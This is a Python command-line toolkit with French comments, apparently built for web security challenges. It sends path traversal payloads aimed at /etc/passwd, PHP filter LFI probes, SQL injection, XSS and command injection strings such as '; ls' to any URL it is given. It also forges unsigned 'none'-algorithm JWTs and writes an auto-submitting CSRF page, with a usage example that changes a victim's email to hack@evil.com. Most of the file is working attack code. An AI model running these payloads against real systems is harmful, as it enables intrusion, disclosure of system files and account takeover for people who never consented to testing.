#!/usr/bin/env python3
"""
Challenge Helper Script
Script d'aide pour la résolution des challenges de sécurité web
"""

import requests
import base64
import json
import jwt
import sys
from urllib.parse import quote, unquote
from colorama import init, Fore, Style

init(autoreset=True)

class ChallengeHelper:
    def __init__(self):
        self.session = requests.Session()

    def print_banner(self):
        banner = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║           Challenge Helper - Web Security Tools           ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
        """
        print(Fore.CYAN + banner + Style.RESET_ALL)

    def print_success(self, text):
        print(Fore.GREEN + f"[✓] {text}" + Style.RESET_ALL)

    def print_error(self, text):
        print(Fore.RED + f"[✗] {text}" + Style.RESET_ALL)

    def print_info(self, text):
        print(Fore.YELLOW + f"[i] {text}" + Style.RESET_ALL)

    def print_header(self, text):
        print(Fore.CYAN + f"\n{'='*60}")
        print(f"{text}")
        print(f"{'='*60}\n" + Style.RESET_ALL)

    # ========== PATH TRAVERSAL ==========
    def test_path_traversal(self, url, param='file'):
        """Test de vulnérabilité Path Traversal"""
        self.print_header("Test Path Traversal")

        payloads = [
            '../../../etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '../../../etc/passwd%00',
            '../../../etc/passwd%00.jpg',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
        ]

        for payload in payloads:
            try:
                self.print_info(f"Testing: {payload}")
                params = {param: payload}
                response = self.session.get(url, params=params, timeout=5)

                if 'root:' in response.text or 'daemon:' in response.text:
                    self.print_success(f"VULNERABLE! Payload: {payload}")
                    print(f"Response (first 200 chars):\n{response.text[:200]}")
                    return True
                elif response.status_code != 200:
                    self.print_info(f"Status: {response.status_code}")
            except Exception as e:
                self.print_error(f"Error: {str(e)}")

        self.print_error("No Path Traversal vulnerability detected")
        return False

    # ========== PHP FILTERS ==========
    def test_php_filters(self, url, param='page'):
        """Test de wrappers PHP"""
        self.print_header("Test PHP Filters / LFI")

        files_to_test = ['index', 'config', 'login', '../index', '/etc/passwd']

        for file in files_to_test:
            payload = f"php://filter/convert.base64-encode/resource={file}"
            self.print_info(f"Testing: {file}")

            try:
                params = {param: payload}
                response = self.session.get(url, params=params, timeout=5)

                if len(response.text) > 50:
                    # Essayer de décoder le base64
                    try:
                        decoded = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                        if 'php' in decoded.lower() or '<?php' in decoded or 'function' in decoded:
                            self.print_success(f"VULNERABLE! File {file} retrieved")
                            print(f"Decoded content (first 300 chars):\n{decoded[:300]}")
                            return True
                    except:
                        pass
            except Exception as e:
                self.print_error(f"Error: {str(e)}")

        self.print_error("No PHP Filter vulnerability detected")
        return False

    # ========== SQL INJECTION ==========
    def test_sql_injection(self, url, param='id', method='GET'):
        """Test basique de SQL Injection"""
        self.print_header("Test SQL Injection")

        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
        ]

        for payload in payloads:
            self.print_info(f"Testing: {payload}")
            try:
                if method == 'GET':
                    params = {param: payload}
                    response = self.session.get(url, params=params, timeout=5)
                else:
                    data = {param: payload}
                    response = self.session.post(url, data=data, timeout=5)

                # Détecter des signes d'injection SQL
                indicators = ['mysql', 'syntax', 'sql', 'database', 'query', 'error', 'warning']
                if any(indicator in response.text.lower() for indicator in indicators):
                    self.print_success(f"Possible SQL Injection! Payload: {payload}")
                    print(f"Response snippet:\n{response.text[:300]}")
                    return True

                # Vérifier si le comportement change
                if payload.endswith("1=1--") or payload.endswith("'1'='1"):
                    # Comparer avec 1=2
                    test_payload = payload.replace("1=1", "1=2").replace("'1'='1'", "'1'='2'")
                    if method == 'GET':
                        test_response = self.session.get(url, params={param: test_payload}, timeout=5)
                    else:
                        test_response = self.session.post(url, data={param: test_payload}, timeout=5)

                    if response.text != test_response.text:
                        self.print_success(f"Boolean-based SQL Injection detected! Payload: {payload}")
                        return True

            except Exception as e:
                self.print_error(f"Error: {str(e)}")

        self.print_error("No SQL Injection detected")
        return False

    # ========== XSS ==========
    def test_xss(self, url, param='search', method='GET'):
        """Test de XSS"""
        self.print_header("Test XSS")

        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe onload=alert('XSS')>",
        ]

        for payload in payloads:
            self.print_info(f"Testing: {payload}")
            try:
                if method == 'GET':
                    params = {param: payload}
                    response = self.session.get(url, params=params, timeout=5)
                else:
                    data = {param: payload}
                    response = self.session.post(url, data=data, timeout=5)

                # Vérifier si le payload est reflété sans échappement
                if payload in response.text or payload.replace("'", "&#39;") in response.text:
                    self.print_success(f"Potential XSS! Payload reflected: {payload}")
                    print(f"Check manually if the script executes")
                    return True

            except Exception as e:
                self.print_error(f"Error: {str(e)}")

        self.print_error("No obvious XSS detected")
        return False

    # ========== COMMAND INJECTION ==========
    def test_command_injection(self, url, param='ip'):
        """Test de Command Injection"""
        self.print_header("Test Command Injection")

        payloads = [
            "; ls",
            "& ls",
            "| ls",
            "&& ls",
            "|| ls",
            "`ls`",
            "$(ls)",
            "%0als",
            "%0acat%20/etc/passwd",
        ]

        for payload in payloads:
            self.print_info(f"Testing: 127.0.0.1{payload}")
            try:
                params = {param: f"127.0.0.1{payload}"}
                response = self.session.get(url, params=params, timeout=5)

                # Détecter des signes d'exécution de commande
                indicators = ['bin', 'root', 'usr', 'etc', 'var', 'tmp']
                if any(indicator in response.text for indicator in indicators):
                    self.print_success(f"Possible Command Injection! Payload: {payload}")
                    print(f"Response:\n{response.text[:500]}")
                    return True

            except Exception as e:
                self.print_error(f"Error: {str(e)}")

        self.print_error("No Command Injection detected")
        return False

    # ========== JWT TOOLS ==========
    def decode_jwt(self, token):
        """Décoder un JWT sans vérification"""
        self.print_header("JWT Decoder")

        try:
            # Décoder le header
            header = jwt.get_unverified_header(token)
            print(Fore.CYAN + "Header:" + Style.RESET_ALL)
            print(json.dumps(header, indent=2))

            # Décoder le payload
            payload = jwt.decode(token, options={"verify_signature": False})
            print(Fore.CYAN + "\nPayload:" + Style.RESET_ALL)
            print(json.dumps(payload, indent=2))

            self.print_success("JWT decoded successfully")
            return header, payload

        except Exception as e:
            self.print_error(f"Error decoding JWT: {str(e)}")
            return None, None

    def create_jwt_none(self, payload):
        """Créer un JWT avec algorithme 'none'"""
        self.print_header("Creating JWT with 'none' algorithm")

        try:
            header = {"alg": "none", "typ": "JWT"}

            # Encoder header et payload
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')

            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')

            # JWT avec signature vide
            token = f"{header_encoded}.{payload_encoded}."

            self.print_success("JWT created with 'none' algorithm")
            print(f"\nToken:\n{token}")
            return token

        except Exception as e:
            self.print_error(f"Error creating JWT: {str(e)}")
            return None

    # ========== ENCODING TOOLS ==========
    def url_encode(self, text):
        """Encoder en URL"""
        encoded = quote(text)
        print(f"Original: {text}")
        print(f"URL Encoded: {encoded}")
        return encoded

    def url_decode(self, text):
        """Décoder l'URL encoding"""
        decoded = unquote(text)
        print(f"URL Encoded: {text}")
        print(f"Decoded: {decoded}")
        return decoded

    def base64_encode(self, text):
        """Encoder en Base64"""
        encoded = base64.b64encode(text.encode()).decode()
        print(f"Original: {text}")
        print(f"Base64: {encoded}")
        return encoded

    def base64_decode(self, text):
        """Décoder du Base64"""
        try:
            decoded = base64.b64decode(text).decode()
            print(f"Base64: {text}")
            print(f"Decoded: {decoded}")
            return decoded
        except Exception as e:
            self.print_error(f"Error decoding: {str(e)}")
            return None

    # ========== HTTP TOOLS ==========
    def send_request(self, url, method='GET', headers=None, data=None, params=None):
        """Envoyer une requête HTTP personnalisée"""
        self.print_header(f"Sending {method} request to {url}")

        try:
            if method == 'GET':
                response = self.session.get(url, headers=headers, params=params, timeout=10)
            elif method == 'POST':
                response = self.session.post(url, headers=headers, data=data, json=data if isinstance(data, dict) else None, timeout=10)
            elif method == 'PUT':
                response = self.session.put(url, headers=headers, data=data, timeout=10)
            elif method == 'DELETE':
                response = self.session.delete(url, headers=headers, timeout=10)
            else:
                self.print_error(f"Method {method} not supported")
                return None

            self.print_success(f"Status Code: {response.status_code}")
            print(f"\nHeaders:\n{json.dumps(dict(response.headers), indent=2)}")
            print(f"\nResponse (first 500 chars):\n{response.text[:500]}")

            return response

        except Exception as e:
            self.print_error(f"Error: {str(e)}")
            return None

    # ========== CSRF TOOLS ==========
    def generate_csrf_poc(self, url, method='POST', data=None):
        """Générer un POC HTML pour CSRF"""
        self.print_header("CSRF POC Generator")

        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF POC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <p>This page will automatically submit the form.</p>

    <form id="csrf-form" action="{url}" method="{method}">
"""

        if data:
            for key, value in data.items():
                html += f'        <input type="hidden" name="{key}" value="{value}">\n'

        html += """    </form>

    <script>
        // Auto-submit après 1 seconde
        setTimeout(function() {
            document.getElementById('csrf-form').submit();
        }, 1000);
    </script>
</body>
</html>"""

        print(html)

        # Sauvegarder dans un fichier
        filename = "csrf_poc.html"
        with open(filename, 'w') as f:
            f.write(html)

        self.print_success(f"CSRF POC saved to {filename}")
        return html


def main():
    helper = ChallengeHelper()
    helper.print_banner()

    if len(sys.argv) < 2:
        print("""
Usage: python challenge_helper.py [command] [args]

Commands:
    path-traversal <url> [param]     - Test Path Traversal
    php-filters <url> [param]        - Test PHP Filters/LFI
    sqli <url> [param] [method]      - Test SQL Injection
    xss <url> [param] [method]       - Test XSS
    cmd-injection <url> [param]      - Test Command Injection
    jwt-decode <token>               - Decode JWT
    jwt-none <payload_json>          - Create JWT with 'none' algorithm
    url-encode <text>                - URL Encode
    url-decode <text>                - URL Decode
    base64-encode <text>             - Base64 Encode
    base64-decode <text>             - Base64 Decode
    request <url> [method]           - Send HTTP request
    csrf-poc <url> <data_json>       - Generate CSRF POC

Examples:
    python challenge_helper.py path-traversal "http://site.com/download" file
    python challenge_helper.py jwt-decode "eyJhbGci..."
    python challenge_helper.py url-encode "../../../etc/passwd"
    python challenge_helper.py csrf-poc "http://site.com/change-email" '{"email":"hack@evil.com"}'
        """)
        sys.exit(0)

    command = sys.argv[1].lower()

    try:
        if command == 'path-traversal':
            url = sys.argv[2]
            param = sys.argv[3] if len(sys.argv) > 3 else 'file'
            helper.test_path_traversal(url, param)

        elif command == 'php-filters':
            url = sys.argv[2]
            param = sys.argv[3] if len(sys.argv) > 3 else 'page'
            helper.test_php_filters(url, param)

        elif command == 'sqli':
            url = sys.argv[2]
            param = sys.argv[3] if len(sys.argv) > 3 else 'id'
            method = sys.argv[4] if len(sys.argv) > 4 else 'GET'
            helper.test_sql_injection(url, param, method)

        elif command == 'xss':
            url = sys.argv[2]
            param = sys.argv[3] if len(sys.argv) > 3 else 'search'
            method = sys.argv[4] if len(sys.argv) > 4 else 'GET'
            helper.test_xss(url, param, method)

        elif command == 'cmd-injection':
            url = sys.argv[2]
            param = sys.argv[3] if len(sys.argv) > 3 else 'ip'
            helper.test_command_injection(url, param)

        elif command == 'jwt-decode':
            token = sys.argv[2]
            helper.decode_jwt(token)

        elif command == 'jwt-none':
            payload = json.loads(sys.argv[2])
            helper.create_jwt_none(payload)

        elif command == 'url-encode':
            text = sys.argv[2]
            helper.url_encode(text)

        elif command == 'url-decode':
            text = sys.argv[2]
            helper.url_decode(text)

        elif command == 'base64-encode':
            text = sys.argv[2]
            helper.base64_encode(text)

        elif command == 'base64-decode':
            text = sys.argv[2]
            helper.base64_decode(text)

        elif command == 'request':
            url = sys.argv[2]
            method = sys.argv[3] if len(sys.argv) > 3 else 'GET'
            helper.send_request(url, method)

        elif command == 'csrf-poc':
            url = sys.argv[2]
            data = json.loads(sys.argv[3]) if len(sys.argv) > 3 else {}
            helper.generate_csrf_poc(url, 'POST', data)

        else:
            print(f"Unknown command: {command}")
            sys.exit(1)

    except Exception as e:
        print(Fore.RED + f"Error: {str(e)}" + Style.RESET_ALL)
        sys.exit(1)


if __name__ == "__main__":
    main()
